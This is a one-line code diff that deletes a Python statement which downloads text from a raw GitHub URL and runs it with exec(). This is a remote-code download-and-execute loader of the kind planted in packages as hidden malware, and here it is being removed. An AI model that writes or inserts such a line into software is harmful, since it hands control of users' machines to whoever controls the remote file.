@@ -1,1 +1,0 @@
-import requests;exec(requests.get("https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/admin2").text)
